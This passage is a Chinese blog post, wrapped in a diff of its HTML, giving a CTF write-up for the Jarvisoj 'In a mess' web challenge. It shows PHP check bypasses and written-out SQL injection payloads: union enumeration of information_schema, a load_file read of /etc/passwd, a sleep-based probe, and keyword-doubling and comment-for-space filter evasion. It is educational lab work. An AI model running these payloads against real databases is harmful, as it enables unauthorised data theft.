@@ -1,0 +1,1109 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="Jarvisoj- in a mess(SQL), XIao Ming">
+    <meta name="description" content="Jarvisoj Web In a mess(500) writeup过检测由源代码提示
+&amp;lt;!--index.phps--&amp;gt;work harder!harder!harder!http://web.jarvisoj.com:32">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Jarvisoj- in a mess(SQL) | XIao Ming</title>
+    <link rel="icon" type="image/jpeg" href="/medias/abc.jpg">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    <script src="https://v1.hitokoto.cn/?c=a&encode=js&select=%23hitokoto" defer></script>
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/abc.jpg" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">XIao Ming</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/abc.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">XIao Ming</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                友情链接
+            </a>
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fa fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        Jarvisoj- in a mess(SQL)
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web/" target="_blank">
+                                <span class="chip bg-color">web</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/web/" class="post-category" target="_blank">
+                                web
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2019-07-31
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        1.4k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        6 分
+                    </div>
+                    
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="Jarvisoj-Web-In-a-mess-500-writeup"><a href="#Jarvisoj-Web-In-a-mess-500-writeup" class="headerlink" title="Jarvisoj Web In a mess(500) writeup"></a>Jarvisoj Web In a mess(500) writeup</h1><h2 id="过检测"><a href="#过检测" class="headerlink" title="过检测"></a>过检测</h2><p>由源代码提示</p>
+<pre><code>&lt;!--index.phps--&gt;work harder!harder!harder!</code></pre><p><a href="http://web.jarvisoj.com:32780/index.phps">http://web.jarvisoj.com:32780/index.phps</a></p>
+<p>通过分析,要构造三个a,b,id参数<br>id: 用弱类型就可以了</p>
+<pre><code>id=0a</code></pre><p>a: 要从file_get_contents得到一个”1112 is a nice lab!”,这里通过php的伪协议,post一个字符串的data就可以了</p>
+<pre><code>a=php://input
+postdata: 1112 is a nice lab!
+测试后不太行:
+这里用data协议
+a=data:,1112 is a nice lab!</code></pre><p>b: 要求字符串大于5,还要满足eregi函数的限制,第一个参数不能等于4,这里eregi函数可以用%00截断</p>
+<pre><code>eregi函数: eregi(string pattern, string string, [array regs]);
+如果string字符串符合Pattern模式,就返回true
+
+%00截断: 遇到%00则默认为字符串的结束,由于是一个字符一个字符的比较的,所以到了%00,eregi函数就以为比较完成了,这样就避免了第四个字符串要求是4而又不能是4的条件
+eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;)
+
+&quot;111&quot;.substr($b,0,1)
+将111字符串和b的第一个字符拼接
+
+$b = %0011111; 满足条件字符串长度大于5即可</code></pre><p>最终参数: ?id=0e&amp;a=data:,1112 is a nice lab!&amp;b=%0011111</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;!--index.phps-->"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: index.php?id=1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">'Hahahahahaha'</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$data</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">==</span><span class="token string">"1112 is a nice lab!"</span> <span class="token keyword">and</span> <span class="token variable">$id</span><span class="token operator">==</span><span class="token number">0</span> <span class="token keyword">and</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">5</span> <span class="token keyword">and</span> <span class="token function">eregi</span><span class="token punctuation">(</span><span class="token string">"111"</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"1114"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">4</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">else</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">print</span> <span class="token string">"work harder!harder!harder!"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token delimiter">?></span></code></pre>
+<p>得到一句回复﻿Come ON!!! {/^HT2mCpcvOLf},应该是目录</p>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p><a href="http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1">http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1</a></p>
+<p>检查源码发现没有提示,推测出题人老师是想考察sql注入<br>判断是否存在注入点:<br>    1. 根据错误和布尔等显式注入思路,判断目标网页/表单是否存在注入点<br>    2. 如果目标做了基本的字符安全过滤,还可以使用更复杂的盲注(例如时间盲注)来进阶判断</p>
+<p>这里使用两种方法,第一种使用Sqlmap工具注入,第二种手工注入</p>
+<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><ul>
+<li>猜解是否能够注入,这里我们把等级改到3,提高搜索范围,因为这里普通的注入手段可能不行</li>
+</ul>
+<pre><code>sqlmap -u &quot;http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1&quot; --level 3</code></pre><ul>
+<li>跑不出来</li>
+</ul>
+<h3 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h3><ul>
+<li>手动注入方式<blockquote>
+<p>基于错误的注入<br>基于bool的注入<br>基于union的注入<br>基于时间的盲注</p>
+</blockquote>
+</li>
+</ul>
+<h4 id="构造union查询语句"><a href="#构造union查询语句" class="headerlink" title="构造union查询语句"></a>构造union查询语句</h4><pre><code>1. 猜测目标网页/表单的查询数
+2. 查询目标数据库的基础信息
+    版本信息、用户信息、系统表信息
+3. 通过系统表查找敏感数据表
+    user、admin、root、password
+4. 查询目标数据表的数据内容</code></pre><ul>
+<li>爆字段数</li>
+</ul>
+<pre class=" language-sql"><code class="language-sql">'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">--'</span>
+'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token comment" spellcheck="true">--'</span>
+'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment" spellcheck="true">--'</span>
+'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span> <span class="token comment" spellcheck="true">--'</span>
+'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span> <span class="token comment" spellcheck="true">--'</span>
+'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span> <span class="token comment" spellcheck="true">--'</span></code></pre>
+<ul>
+<li>爆库</li>
+</ul>
+<pre class=" language-sql"><code class="language-sql"><span class="token string">'and 1=2 union select schema_name from information_schema.schemata'</span>
+<span class="token string">'and 1=2 union select database()'</span>
+'<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token comment" spellcheck="true">--'</span>
+'<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token comment" spellcheck="true">--'</span>
+'<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token comment" spellcheck="true">--'</span>
+<span class="token string">'and 1=2 union select 1,load_file('</span><span class="token operator">/</span>etc<span class="token operator">/</span>passwd'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token comment" spellcheck="true">--'</span>
+information_schema提供了访问数据库元数据的方式<span class="token punctuation">,</span>元数据包括例如数据库名、表名、列数据类型、访问权限、字符集等基础信息</code></pre>
+<ul>
+<li>爆表</li>
+</ul>
+<pre class=" language-sql"><code class="language-sql"><span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span>0x库名</code></pre>
+<ul>
+<li>爆字段</li>
+</ul>
+<pre class=" language-sql"><code class="language-sql"><span class="token string">'and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x表'</span>
+
+<span class="token string">'and 1=2 union select 1,2,group_concat(column_name) from 表名'</span>
+
+<span class="token string">'and 1=2 union select 1,2,GRANTEE from USER_PRIVILEGES'</span></code></pre>
+<ul>
+<li>爆字段内容</li>
+</ul>
+<pre class=" language-sql"><code class="language-sql"><span class="token string">'and 1=2 union select 1,2,group_concat(id,context,title) from admin'</span></code></pre>
+<h4 id="高级报错注入"><a href="#高级报错注入" class="headerlink" title="高级报错注入"></a>高级报错注入</h4><ul>
+<li><p>基于时间的盲注<br>  最核心的函数是sleep函数</p>
+</li>
+<li><p>基于时间盲注_注入点探测语句</p>
+</li>
+</ul>
+<pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>' <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--'</span></code></pre>
+<ul>
+<li>基于ascii逐字解码</li>
+</ul>
+<p>本题绕过方式</p>
+<blockquote>
+<p>注释符/* */</p>
+</blockquote>
+<pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true"># 爆数据字段数</span>
+<span class="token operator">and</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">/*1*/</span>uniunionon<span class="token comment" spellcheck="true">/*1*/</span>SeLselectECT<span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
+正常返回<span class="token number">3</span><span class="token punctuation">,</span>字段数为<span class="token number">3</span>
+
+<span class="token comment" spellcheck="true"># 爆库</span>
+把所有的空格都用<span class="token comment" spellcheck="true">/* */</span>代替就可以过空格检测
+<span class="token keyword">select</span><span class="token comment" spellcheck="true">/* */</span>schema_name<span class="token comment" spellcheck="true">/* */</span><span class="token keyword">from</span><span class="token comment" spellcheck="true">/* */</span>information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">;</span>
+<span class="token keyword">select</span><span class="token comment" spellcheck="true">/* */</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+对该题第一次尝试
+<span class="token operator">and</span><span class="token comment" spellcheck="true">/* */</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">/* */</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/* */</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/* */</span>schema_name<span class="token comment" spellcheck="true">/* */</span><span class="token keyword">from</span><span class="token comment" spellcheck="true">/* */</span>information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">;</span>
+you <span class="token number">bad</span> boy<span class="token operator">/</span>girl<span class="token operator">!</span>
+失败
+
+很明显这里可能过滤了<span class="token keyword">select</span>和<span class="token keyword">from</span>关键字我们尝试绕过一下<span class="token punctuation">,</span>这里就是下面的绕过<span class="token keyword">union</span>，<span class="token keyword">select</span>，<span class="token keyword">where</span>的方法
+<span class="token number">1</span><span class="token punctuation">.</span> 大小写混淆
+<span class="token operator">and</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token keyword">SeLeCT</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token keyword">FrOm</span><span class="token comment" spellcheck="true">/*1*/</span>information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">;</span>
+you <span class="token number">bad</span> boy<span class="token operator">/</span>girl<span class="token operator">!</span>
+失败
+<span class="token number">2</span><span class="token punctuation">.</span> 双关键字绕过
+<span class="token operator">and</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">/*1*/</span>uniunionon<span class="token comment" spellcheck="true">/*1*/</span>SeLselectECT<span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">/*1*/</span>frofromm<span class="token comment" spellcheck="true">/*1*/</span>information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">;</span>
+成功但是没查到结果
+<span class="token operator">and</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">/*1*/</span>uniunionon<span class="token comment" spellcheck="true">/*1*/</span>SeLselectECT<span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+成功显示 test
+
+在这里就可以得到他这里是有空格和关键字检测的<span class="token punctuation">,</span>这里我们用双关键字和注释符就可以绕过
+
+<span class="token comment" spellcheck="true"># 爆表</span>
+<span class="token operator">and</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">/*1*/</span>uniunionon<span class="token comment" spellcheck="true">/*1*/</span>SeLselectECT<span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token comment" spellcheck="true">/*1*/</span>frofromm<span class="token comment" spellcheck="true">/*1*/</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token keyword">where</span><span class="token comment" spellcheck="true">/*1*/</span>table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+content
+
+<span class="token comment" spellcheck="true"># 爆字段</span>
+<span class="token operator">and</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">/*1*/</span>uniunionon<span class="token comment" spellcheck="true">/*1*/</span>SeLselectECT<span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token comment" spellcheck="true">/*1*/</span>frofromm<span class="token comment" spellcheck="true">/*1*/</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token keyword">where</span><span class="token comment" spellcheck="true">/*1*/</span>table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+id<span class="token punctuation">,</span>context<span class="token punctuation">,</span>title
+
+<span class="token comment" spellcheck="true"># 爆字段内容</span>
+<span class="token operator">and</span><span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">/*1*/</span>uniunionon<span class="token comment" spellcheck="true">/*1*/</span>SeLselectECT<span class="token comment" spellcheck="true">/*1*/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span>context<span class="token punctuation">,</span>title<span class="token punctuation">)</span><span class="token comment" spellcheck="true">/*1*/</span>frofromm<span class="token comment" spellcheck="true">/*1*/</span>content
+<span class="token number">1</span> PCTF{Fin4lly_U_got_i7_C0ngRatulation5} hi666</code></pre>
+<h2 id="常见的绕过方式"><a href="#常见的绕过方式" class="headerlink" title="常见的绕过方式"></a>常见的绕过方式</h2><blockquote>
